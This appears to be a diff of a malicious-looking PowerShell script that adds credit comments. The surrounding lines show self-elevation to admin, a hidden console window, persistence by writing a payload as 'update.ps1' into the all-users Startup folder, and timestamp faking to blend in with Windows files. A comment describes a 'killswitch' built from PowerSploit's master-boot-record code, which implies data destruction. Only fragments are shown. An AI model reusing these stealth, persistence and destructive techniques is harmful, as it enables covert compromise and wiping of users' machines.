@@ -30,6 +30,7 @@ if ($myWindowsPrincipal.IsInRole($adminRole)){
    # Exit from the current, unelevated, process
    exit
 }
+## above section originally from Ben Armstrong: https://blogs.msdn.microsoft.com/virtual_pc_guy/2010/09/23/a-self-elevating-powershell-script/
 #hides powershell window
   $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
   add-type -name win -member $t -namespace native
@@ -260,7 +261,10 @@ $checkcode = @'
         }
       
 
-'@         
+'@    
+#disk encryption code used for killswitch is original from PowerSploit's Set-MasterBootRecord
+#https://github.com/PowerShellMafia/PowerSploit
+#     
 #writes above code block to update.ps1 file in startup folder
 set-content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1" "$checkcode"
 #change file timestamps to match a C:\Windows 
